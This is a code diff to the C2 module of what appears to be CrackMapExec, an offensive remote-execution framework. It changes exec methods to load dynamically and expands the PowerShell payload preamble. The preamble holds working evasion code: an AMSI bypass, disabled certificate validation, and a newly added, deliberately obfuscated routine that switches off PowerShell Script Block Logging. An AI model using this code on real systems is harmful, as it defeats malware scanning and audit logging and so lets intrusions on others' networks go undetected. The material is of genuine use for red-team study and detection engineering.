@@ -1,7 +1,9 @@
+import cme
 import logging
+import imp
+import os
 from traceback import format_exc
 from cme.helpers.powershell import strip_ps_code, encode_ps_command
-from cme.protocols.smb.c2.exec_methods import *
 
 
 class C2(object):
@@ -14,30 +16,35 @@ class C2(object):
         self.password = proto.password
         self.nthash = proto.nthash
         self.lmhash = proto.lmhash
-        self.aesKey = None
-        self.doKerberos = False
         self.payload = payload
         self.exec_methods = exec_methods
         self.force_ps32 = force_ps32
         self.ret_output = ret_output
-        self.available_exec_methods = {
-            "wmiexec": WMIEXEC,
-            "smbexec": SMBEXEC,
-            "atexec": TSCH_EXEC,
-            "mmcexec": MMCEXEC,
-            "shellbrwwinexec": SHELLBRWWINEXEC,
-            "shellwinexec": SHELLWINEXEC
-        }
+        self.aesKey = None
+        self.doKerberos = False
 
     def run(self):
         pass
+
+    def available_exec_methods(self):
+        exec_methods = {}
+
+        exec_method_path = os.path.join(os.path.dirname(cme.__file__), 'c2', 'exec_methods')
+
+        for execm in os.listdir(exec_method_path):
+            if execm[-3:] == '.py' and execm[:-3] != '__init__':
+                execm_name = execm[:-3]
+
+                exec_methods[execm_name] = imp.load_source('exec_method', os.path.join(exec_method_path, execm))
+
+        return exec_methods
 
     def execute_command(self, command):
         command = self.create_ps_command(self.build_ps_command(command, self.ret_output), self.force_ps32)
         for method in self.exec_methods:
             try:
                 logging.debug('Executing command via {} exec method'.format(method))
-                m = self.available_exec_methods[method](self.target, self.username, self.password, self.domain, self.lmhash, self.nthash)
+                m = getattr(self.available_exec_methods()[method], method.upper())(self.target, self.username, self.password, self.domain, self.lmhash, self.nthash)
                 m.execute_command(command)
                 break
             except Exception:
@@ -46,10 +53,26 @@ class C2(object):
 
     def create_ps_payload(self, payload):
 
-        preamble = """try{
+        preamble = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+try{
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
 }catch{}
-[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+try{
+    $GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static')
+    If ($GroupPolicyField) {
+        $GroupPolicyCache = $GroupPolicyField.GetValue($null)
+        If ($GroupPolicyCache['ScriptB'+'lockLogging']) {
+            $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0
+            $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
+        }
+        $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new()
+        $val.Add('EnableScriptB'+'lockLogging', 0)
+        $val.Add('EnableScriptB'+'lockInvocationLogging', 0)
+        $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] = $val
+    } else {
+        [ScriptBlock]."GetFie`ld"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
+    }
+}catch{}
 """
         payload = preamble + strip_ps_code(payload)
 
